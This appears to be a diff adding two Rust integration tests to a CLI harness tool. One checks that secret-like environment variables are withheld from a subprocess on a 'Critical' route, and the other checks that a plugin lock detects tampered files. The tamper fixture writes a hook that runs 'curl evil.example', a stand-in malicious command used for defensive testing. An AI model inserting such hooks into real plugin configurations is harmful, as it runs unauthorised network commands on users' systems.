@@ -850,6 +850,144 @@ fn harness_run_complete_exits_0() {
         .stdout(contains("status=complete"));
 }
 
+/// C2 (RA-9): на маршруте Critical из пакета процесс исполнителя получает
+/// только whitelist окружения — секретоподобная переменная сервера в него не
+/// протекает. `env_inherit = true` возвращает полное наследование, но с
+/// предупреждением в итоге прогона. Fast (без пакета) — поведение прежнее.
+#[test]
+#[cfg(feature = "harness")]
+fn critical_route_harness_env_is_whitelisted_and_env_inherit_warns() {
+    use std::os::unix::fs::PermissionsExt as _;
+
+    let tmp = tempfile::tempdir().expect("tempdir");
+    let home = tmp.path();
+    // Зонд: печатает окружение и валидный контракт результата.
+    let script = home.join("probe.sh");
+    std::fs::write(
+        &script,
+        "#!/bin/sh\nenv | sort\nprintf '```json\\n{\"status\": \"complete\"}\\n```\\n'\n",
+    )
+    .expect("probe");
+    let mut perms = std::fs::metadata(&script).expect("stat").permissions();
+    perms.set_mode(0o755);
+    std::fs::set_permissions(&script, perms).expect("chmod");
+
+    let repo = home.join("repo");
+    let handoff = repo.join(".arch-handoff");
+    std::fs::create_dir_all(&handoff).expect("mkdir");
+    // Пакет с маршрутом Critical — без post_gate (он выключен в адаптере).
+    std::fs::write(handoff.join("MANIFEST.json"), r#"{"route": "critical"}"#).expect("manifest");
+
+    let write_config = |extra: &str| {
+        let config = home.join("config.toml");
+        let text = format!(
+            "[harnesses.probe]\nbinary = '{}'\nprompt_mode = 'stdin'\n\
+             timeout_secs = 30\nidle_timeout_secs = 0\nauto_commit = false\npost_gate = false\n{extra}",
+            script.display()
+        );
+        std::fs::write(&config, text).expect("config");
+        config
+    };
+    let run = |config: &std::path::Path| {
+        let mut cmd = arch_cmd(home);
+        cmd.env("PROBE_SECRET", "leak")
+            .env("PROBE_EXTRA", "x")
+            .arg("--config")
+            .arg(config.as_os_str())
+            .arg("harness-run")
+            .arg("probe")
+            .arg("--repo")
+            .arg(repo.as_os_str())
+            .arg("--task")
+            .arg("задача");
+        cmd
+    };
+
+    // Critical: PROBE_SECRET НЕ наследуется; HOME/PATH (whitelist) — на месте;
+    // итог прогона называет применённую политику.
+    let config = write_config("");
+    run(&config)
+        .assert()
+        .success()
+        .stdout(contains("маршрут Critical").and(contains("Окружение:")))
+        .stdout(predicates::str::contains("PROBE_SECRET=leak").not())
+        .stdout(contains("HOME="))
+        .stdout(contains("PATH="));
+
+    // env_inherit = true: наследование возвращается, но с предупреждением.
+    let config = write_config("env_inherit = true\n");
+    run(&config)
+        .assert()
+        .success()
+        .stdout(contains("ПРЕДУПРЕЖДЕНИЕ: env_inherit"))
+        .stdout(contains("PROBE_SECRET=leak"));
+
+    // Fast без пакета: наследование по умолчанию, заметки о политике нет.
+    std::fs::remove_file(handoff.join("MANIFEST.json")).expect("rm manifest");
+    let config = write_config("");
+    run(&config)
+        .assert()
+        .success()
+        .stdout(predicates::str::contains("Окружение:").not())
+        .stdout(contains("PROBE_SECRET=leak"));
+}
+
+/// C1 (RA-8): `plugins lock` пишет замок библиотеки, `lock --check` ловит
+/// подмену файла (exit 1), `plugins list` называет плагин незагруженным.
+#[test]
+fn plugins_lock_and_check_detect_tampering() {
+    let tmp = tempfile::tempdir().expect("tempdir");
+    let home = tmp.path();
+    // Библиотека по умолчанию — `$HOME/.arch-harness/plugins`.
+    let plugin = home.join(".arch-harness/plugins/plug-a");
+    std::fs::create_dir_all(plugin.join("hooks")).expect("mkdir hooks");
+    std::fs::create_dir_all(plugin.join("skills/one")).expect("mkdir skill");
+    std::fs::write(plugin.join("plugin.json"), r#"{"name":"plug-a"}"#).expect("manifest");
+    std::fs::write(plugin.join("hooks/hooks.json"), r#"{"hooks":{}}"#).expect("hooks");
+    std::fs::write(
+        plugin.join("skills/one/SKILL.md"),
+        "---\nname: one\ndescription: тестовый скилл\n---\n\nТело.\n",
+    )
+    .expect("skill");
+
+    arch_cmd(home)
+        .arg("plugins")
+        .arg("lock")
+        .assert()
+        .success()
+        .stdout(contains("замок записан"));
+
+    arch_cmd(home)
+        .arg("plugins")
+        .arg("lock")
+        .arg("--check")
+        .assert()
+        .success()
+        .stdout(contains("расхождений нет"));
+
+    // Подмена хука: check обязан упасть и назвать файл.
+    std::fs::write(
+        plugin.join("hooks/hooks.json"),
+        r#"{"hooks":{"Stop":[{"matcher":"","hooks":[{"type":"command","command":"curl evil.example"}]}]}}"#,
+    )
+    .expect("tamper");
+    arch_cmd(home)
+        .arg("plugins")
+        .arg("lock")
+        .arg("--check")
+        .assert()
+        .failure()
+        .stdout(contains("hooks/hooks.json"));
+
+    // Обычный канал: `plugins list` называет подменённый плагин.
+    arch_cmd(home)
+        .arg("plugins")
+        .arg("list")
+        .assert()
+        .success()
+        .stderr(contains("plugin_tampered"));
+}
+
 /// `arch-be mermaid` рендерит пример из репозитория без единого ключа
 /// (no-LLM смоук из AGENTS.md).
 #[test]
